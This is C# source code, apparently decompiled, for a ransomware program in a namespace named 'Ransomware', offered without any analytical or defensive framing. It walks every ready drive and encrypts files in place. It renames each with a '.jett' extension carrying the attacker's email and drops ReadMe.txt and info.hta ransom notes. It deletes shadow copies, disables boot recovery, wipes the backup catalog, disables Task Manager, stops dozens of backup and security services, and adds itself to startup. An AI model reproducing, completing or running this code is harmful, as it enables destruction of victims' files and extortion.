using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using Ransomware.Properties;
using winlogon;

namespace Ransomware;

public class Encryption
{
	public class Crypt
	{
		public class ISAAC
		{
			public const int SIZEL = 9;

			public const int SIZE = 512;

			public const int MASK = 2044;

			public int count;

			public int[] rsl;

			public int[] mem;

			private int a;

			private int b;

			private int c;

			public ISAAC()
			{
				mem = new int[512];
				rsl = new int[512];
				Init(flag: false);
			}

			public ISAAC(int[] seed)
			{
				mem = new int[512];
				rsl = new int[512];
				for (int i = 0; i < seed.Length; i++)
				{
					rsl[i] = seed[i];
				}
				Init(flag: true);
			}

			public void Isaac()
			{
				b += ++c;
				int num = 0;
				int num2 = 256;
				while (num < 256)
				{
					int num3 = mem[num];
					a ^= a << 13;
					a += mem[num2++];
					int num4 = (mem[num] = mem[(num3 & 0x7FC) >> 2] + a + b);
					rsl[num++] = (b = mem[((num4 >> 9) & 0x7FC) >> 2] + num3);
					num3 = mem[num];
					a ^= a >>> 6;
					a += mem[num2++];
					num4 = (mem[num] = mem[(num3 & 0x7FC) >> 2] + a + b);
					rsl[num++] = (b = mem[((num4 >> 9) & 0x7FC) >> 2] + num3);
					num3 = mem[num];
					a ^= a << 2;
					a += mem[num2++];
					num4 = (mem[num] = mem[(num3 & 0x7FC) >> 2] + a + b);
					rsl[num++] = (b = mem[((num4 >> 9) & 0x7FC) >> 2] + num3);
					num3 = mem[num];
					a ^= a >>> 16;
					a += mem[num2++];
					num4 = (mem[num] = mem[(num3 & 0x7FC) >> 2] + a + b);
					rsl[num++] = (b = mem[((num4 >> 9) & 0x7FC) >> 2] + num3);
				}
				num2 = 0;
				while (num2 < 256)
				{
					int num3 = mem[num];
					a ^= a << 13;
					a += mem[num2++];
					int num4 = (mem[num] = mem[(num3 & 0x7FC) >> 2] + a + b);
					rsl[num++] = (b = mem[((num4 >> 9) & 0x7FC) >> 2] + num3);
					num3 = mem[num];
					a ^= a >>> 6;
					a += mem[num2++];
					num4 = (mem[num] = mem[(num3 & 0x7FC) >> 2] + a + b);
					rsl[num++] = (b = mem[((num4 >> 9) & 0x7FC) >> 2] + num3);
					num3 = mem[num];
					a ^= a << 2;
					a += mem[num2++];
					num4 = (mem[num] = mem[(num3 & 0x7FC) >> 2] + a + b);
					rsl[num++] = (b = mem[((num4 >> 9) & 0x7FC) >> 2] + num3);
					num3 = mem[num];
					a ^= a >>> 16;
					a += mem[num2++];
					num4 = (mem[num] = mem[(num3 & 0x7FC) >> 2] + a + b);
					rsl[num++] = (b = mem[((num4 >> 9) & 0x7FC) >> 2] + num3);
				}
			}

			public void Init(bool flag)
			{
				int num7;
				int num6;
				int num5;
				int num4;
				int num3;
				int num2;
				int num;
				int num8 = (num7 = (num6 = (num5 = (num4 = (num3 = (num2 = (num = -1640531527)))))));
				for (int i = 0; i < 4; i++)
				{
					num8 ^= num7 << 11;
					num5 += num8;
					num7 += num6;
					num7 ^= num6 >>> 2;
					num4 += num7;
					num6 += num5;
					num6 ^= num5 << 8;
					num3 += num6;
					num5 += num4;
					num5 ^= num4 >>> 16;
					num2 += num5;
					num4 += num3;
					num4 ^= num3 << 10;
					num += num4;
					num3 += num2;
					num3 ^= num2 >>> 4;
					num8 += num3;
					num2 += num;
					num2 ^= num << 8;
					num7 += num2;
					num += num8;
					num ^= num8 >>> 9;
					num6 += num;
					num8 += num7;
				}
				for (int i = 0; i < 512; i += 8)
				{
					if (flag)
					{
						num8 += rsl[i];
						num7 += rsl[i + 1];
						num6 += rsl[i + 2];
						num5 += rsl[i + 3];
						num4 += rsl[i + 4];
						num3 += rsl[i + 5];
						num2 += rsl[i + 6];
						num += rsl[i + 7];
					}
					num8 ^= num7 << 11;
					num5 += num8;
					num7 += num6;
					num7 ^= num6 >>> 2;
					num4 += num7;
					num6 += num5;
					num6 ^= num5 << 8;
					num3 += num6;
					num5 += num4;
					num5 ^= num4 >>> 16;
					num2 += num5;
					num4 += num3;
					num4 ^= num3 << 10;
					num += num4;
					num3 += num2;
					num3 ^= num2 >>> 4;
					num8 += num3;
					num2 += num;
					num2 ^= num << 8;
					num7 += num2;
					num += num8;
					num ^= num8 >>> 9;
					num6 += num;
					num8 += num7;
					mem[i] = num8;
					mem[i + 1] = num7;
					mem[i + 2] = num6;
					mem[i + 3] = num5;
					mem[i + 4] = num4;
					mem[i + 5] = num3;
					mem[i + 6] = num2;
					mem[i + 7] = num;
				}
				if (flag)
				{
					for (int i = 0; i < 512; i += 8)
					{
						num8 += mem[i];
						num7 += mem[i + 1];
						num6 += mem[i + 2];
						num5 += mem[i + 3];
						num4 += mem[i + 4];
						num3 += mem[i + 5];
						num2 += mem[i + 6];
						num += mem[i + 7];
						num8 ^= num7 << 11;
						num5 += num8;
						num7 += num6;
						num7 ^= num6 >>> 2;
						num4 += num7;
						num6 += num5;
						num6 ^= num5 << 8;
						num3 += num6;
						num5 += num4;
						num5 ^= num4 >>> 16;
						num2 += num5;
						num4 += num3;
						num4 ^= num3 << 10;
						num += num4;
						num3 += num2;
						num3 ^= num2 >>> 4;
						num8 += num3;
						num2 += num;
						num2 ^= num << 8;
						num7 += num2;
						num += num8;
						num ^= num8 >>> 9;
						num6 += num;
						num8 += num7;
						mem[i] = num8;
						mem[i + 1] = num7;
						mem[i + 2] = num6;
						mem[i + 3] = num5;
						mem[i + 4] = num4;
						mem[i + 5] = num3;
						mem[i + 6] = num2;
						mem[i + 7] = num;
					}
				}
				Isaac();
				count = 512;
			}

			public int val()
			{
				if (count-- == 0)
				{
					Isaac();
					count = 511;
				}
				return rsl[count];
			}
		}

		public const int TUMBLE = 3;

		public static string password { get; set; }

		public static string passwordRsa { get; set; }

		public static ISAAC PrepareKey()
		{
			try
			{
				string machineName = Environment.MachineName;
				byte[] bytes = Encoding.UTF8.GetBytes(password);
				ISAAC iSAAC = new ISAAC();
				for (int i = 0; i < 3; i++)
				{
					iSAAC.Isaac();
				}
				for (int j = 0; j < 512; j++)
				{
					iSAAC.mem[j] = bytes[j];
				}
				StringBuilder stringBuilder = new StringBuilder(machineName.Length);
				for (int k = 0; k < machineName.Length; k++)
				{
					stringBuilder.Append(' ');
				}
				machineName = stringBuilder.ToString();
				for (int l = 0; l < bytes.Length; l++)
				{
					bytes[l] = 0;
				}
				machineName = null;
				bytes = null;
				for (int m = 0; m < 3; m++)
				{
					iSAAC.Isaac();
				}
				return iSAAC;
			}
			catch (WebException)
			{
				return null;
			}
			catch
			{
				return null;
			}
		}

		public static void CryptFile(ISAAC csprng, byte[] subkey, string loc)
		{
			FileStream fileStream = null;
			int[] array = null;
			try
			{
				fileStream = File.Open(loc, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
				array = new int[512];
				for (int i = 0; i < 512; i++)
				{
					array[i] = csprng.mem[i];
				}
				for (int j = 0; j < subkey.Length; j++)
				{
					csprng.mem[j] ^= subkey[j];
				}
				byte[] array2 = new byte[819200];
				int num = fileStream.Read(array2, 0, 819200);
				do
				{
					csprng.Isaac();
					for (int k = 0; k < num; k++)
					{
						array2[k] = (byte)(array2[k] ^ csprng.rsl[k % 512]);
					}
					fileStream.Seek(-num, SeekOrigin.Current);
					fileStream.Write(array2, 0, num);
				}
				while ((num = fileStream.Read(array2, 0, 819200)) > 0);
			}
			catch (UnauthorizedAccessException)
			{
			}
			finally
			{
				if (fileStream != null)
				{
					fileStream.Close();
					fileStream.Dispose();
				}
				if (array != null)
				{
					csprng.mem = array;
					csprng.Isaac();
				}
			}
		}
	}

	public static string EncryptLongString(string textToEncrypt, string publicKeyString)
	{
		try
		{
			using Aes aes = Aes.Create();
			aes.KeySize = 256;
			aes.GenerateKey();
			aes.GenerateIV();
			byte[] array;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (ICryptoTransform transform = aes.CreateEncryptor())
				{
					using CryptoStream stream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
					using StreamWriter streamWriter = new StreamWriter(stream);
					streamWriter.Write(textToEncrypt);
				}
				array = memoryStream.ToArray();
			}
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(4096);
			rSACryptoServiceProvider.FromXmlString(publicKeyString);
			byte[] array2 = rSACryptoServiceProvider.Encrypt(aes.Key, fOAEP: true);
			byte[] array3 = new byte[4 + array2.Length + 16 + array.Length];
			BitConverter.GetBytes(array2.Length).CopyTo(array3, 0);
			array2.CopyTo(array3, 4);
			aes.IV.CopyTo(array3, 4 + array2.Length);
			array.CopyTo(array3, 4 + array2.Length + 16);
			return Convert.ToBase64String(array3);
		}
		catch (Exception ex)
		{
			throw new Exception("خطا در رمزنگاری: " + ex.Message);
		}
	}

	public static string rsaKey()
	{
		if (File.Exists("public_key.xml"))
		{
			return File.ReadAllText("public_key.xml");
		}
		throw new FileNotFoundException("Public key file not found!");
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			return Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true));
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static string MD5(string input)
	{
		byte[] source = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(input));
		return string.Join("", source.Select((byte b) => b.ToString("x2")).ToArray());
	}

	private static string SHA1(string input)
	{
		byte[] source = new SHA1CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(input));
		return string.Join("", source.Select((byte b) => b.ToString("x2")).ToArray());
	}

	private static void LogError(string _message)
	{
		Console.BackgroundColor = ConsoleColor.Red;
		Console.WriteLine(_message);
		Console.ResetColor();
	}

	public static byte[] KeyEncrypt(string s)
	{
		return new UTF8Encoding().GetBytes(SHA1(MD5(MD5(SHA1(s)))));
	}

	internal static void Encrypt(string name)
	{
		try
		{
			string fileName = Path.GetFileName(name);
			string extension = Path.GetExtension(name);
			if (extension == ".jett")
			{
				return;
			}
			switch (fileName)
			{
			case "private_key.xml":
				return;
			case "Key.bin":
				return;
			case "info.hta":
				return;
			}
			string[] source = new string[8] { "BOOTNXT", "bootmgr", "BOOTSECT.BAK", "boot.sdi", "ReAgent.xml", "Winre.wim", "BOOTSTAT.DAT", "bootx64.efi" };
			if (extension == ".BCD.LOG1" || extension == ".BCD.LOG2" || source.Contains(fileName))
			{
				return;
			}
			Console.WriteLine(name);
			string? directoryName = Path.GetDirectoryName(name);
			string path = Path.Combine(directoryName, "ReadMe.txt");
			string path2 = Path.Combine(directoryName, "info.hta");
			if (!File.Exists(path))
			{
				try
				{
					File.WriteAllText(path, config.Readme_Text.Replace("_pcid_", config.GetID()).Replace("_em1_", config.Email_1).Replace("_em2_", config.Email_2));
				}
				catch
				{
				}
			}
			if (!File.Exists(path2))
			{
				try
				{
					File.WriteAllText(path2, Resources.info.Replace("_email2_", config.Email_2).Replace("_email1_", config.Email_1).Replace("_id_", config.GetID()));
				}
				catch
				{
				}
			}
			Crypt.PrepareKey();
			Crypt.CryptFile(new Crypt.ISAAC(), KeyEncrypt(Crypt.password), name);
			File.Move(name, name + ".[" + ServerConnection.GetID() + "][" + config.Email_1 + "].jett");
		}
		catch (Exception ex)
		{
			LogError(ex.Message);
		}
	}

	public static void StartEncryption()
	{
		try
		{
			ParallelOptions parallelOptions = new ParallelOptions
			{
				MaxDegreeOfParallelism = Environment.ProcessorCount
			};
			List<DriveInfo> list = (from x in DriveInfo.GetDrives()
				where x.IsReady
				select x).ToList();
			List<Thread> list2 = new List<Thread>();
			foreach (DriveInfo drive in list)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						Parallel.ForEach(Directory.GetFiles(drive.Name, "*.*", SearchOption.TopDirectoryOnly), parallelOptions, delegate(string file)
						{
							try
							{
								Encrypt(file);
							}
							catch
							{
							}
						});
						Parallel.ForEach((from dir in Directory.GetDirectories(drive.Name)
							where NecessaryToEncrypt(dir)
							select dir).ToList(), parallelOptions, delegate(string directory)
						{
							try
							{
								SearchDirectory(directory);
							}
							catch
							{
							}
						});
					}
					catch
					{
					}
				});
				list2.Add(thread);
				thread.Start();
			}
			foreach (Thread item in list2)
			{
				item.Join();
			}
		}
		catch
		{
		}
	}

	public static bool NecessaryToEncrypt(string folder_path)
	{
		string normalizedPath = Path.GetFullPath(folder_path).TrimEnd(new char[1] { '\\' });
		string text = folder_path.Split(new char[1] { ':' })[0];
		if (new string[5]
		{
			text + ":\\$RECYCLE.BIN",
			text + ":\\$Recycle.Bin",
			text + ":\\System Volume Information",
			Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + "Windows",
			Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)) + "Documents and Settings"
		}.Any((string p) => normalizedPath.Equals(p, StringComparison.OrdinalIgnoreCase)))
		{
			return false;
		}
		if (new string[23]
		{
			"C:\\ProgramData\\Microsoft\\Windows", "C:\\ProgramData\\Microsoft\\Windows Defender", "C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection", "C:\\ProgramData\\Microsoft\\Windows Security Health", "C:\\Program Files (x86)\\Microsoft", "C:\\Program Files (x86)\\Microsoft.NET", "C:\\Program Files (x86)\\Windows Defender", "C:\\Program Files (x86)\\Windows Mail", "C:\\Program Files (x86)\\Windows Media Player", "C:\\Program Files (x86)\\Windows NT",
			"C:\\Program Files (x86)\\Windows Photo Viewer", "C:\\Program Files (x86)\\WindowsPowerShell", "C:\\Program Files\\Windows Defender", "C:\\Program Files\\Windows Defender Advanced Threat Protection", "C:\\Program Files\\Windows Mail", "C:\\Program Files\\Windows Media Player", "C:\\Program Files\\Windows NT", "C:\\Program Files\\Windows Photo Viewer", "C:\\Program Files\\WindowsApps", "C:\\Program Files\\WindowsPowerShell",
			"C:\\Users\\Default", "C:\\Users\\Public", "C:\\Users\\All Users"
		}.Any((string p) => normalizedPath.StartsWith(p, StringComparison.OrdinalIgnoreCase)))
		{
			return false;
		}
		return true;
	}

	private static void SearchDirectory(string path)
	{
		try
		{
			ParallelOptions parallelOptions = new ParallelOptions
			{
				MaxDegreeOfParallelism = Environment.ProcessorCount
			};
			Parallel.ForEach((from x in Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly)
				orderby Guid.NewGuid()
				select x).ToList(), parallelOptions, delegate(string file)
			{
				try
				{
					Encrypt(file);
				}
				catch
				{
				}
			});
			Parallel.ForEach((from dir in Directory.GetDirectories(path)
				where NecessaryToEncrypt(dir)
				select dir into x
				orderby Guid.NewGuid()
				select x).ToList(), parallelOptions, delegate(string directory)
			{
				try
				{
					SearchDirectory(directory);
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/C " + commands,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		foreach (string text in array)
		{
			try
			{
				new ServiceController(text).Stop();
			}
			catch
			{
			}
		}
	}

	private static void Main(string[] args)
	{
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		try
		{
			ServerConnection.RequireAdministratorAccess();
			DisableTaskManager();
			deleteShadowCopies();
			disableRecoveryMode();
			deleteBackupCatalog();
			stopBackupServices();
			if (!File.Exists("public_key.xml"))
			{
				ServerConnection.GenerateAndSaveRSAKeys();
			}
			Crypt.password = UltraSecureKeyGenerator.CreatePassword(4094);
			Crypt.passwordRsa = EncryptLongString(Crypt.password, rsaKey());
			File.WriteAllText("C:Key.bin", Crypt.passwordRsa);
			File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Key.bin"), Crypt.passwordRsa);
			ServerConnection.StartUPAdd();
			StartEncryption();
			string fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "info.hta");
			for (int i = 0; i < 3; i++)
			{
				try
				{
					Process.Start(fileName);
					Thread.Sleep(500);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
